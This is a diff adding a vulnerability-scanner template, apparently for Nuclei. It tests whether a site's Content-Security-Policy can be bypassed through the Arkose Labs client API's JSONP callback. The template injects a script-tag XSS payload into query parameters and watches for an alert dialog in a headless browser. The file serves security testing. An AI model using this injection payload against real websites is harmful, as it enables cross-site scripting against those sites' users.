@@ -1,0 +1,55 @@
+id: arkoselabs-client-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Arkose Labs Client API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,arkoselabs-client-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "arkoselabs.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: arkoselabs_client_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "arkoselabs_client_api_csp_xss == true"
+# digest: 4a0a004730450220645722c50dc54ab3106fb76cf356e11f72f8976870209d661c7b19a55f831523022100a4da8708e27bda53993ae4b989096c978f63878ab54f83b5f1994954d7fbb367:922c64590222798bb761d5b6d8e72950
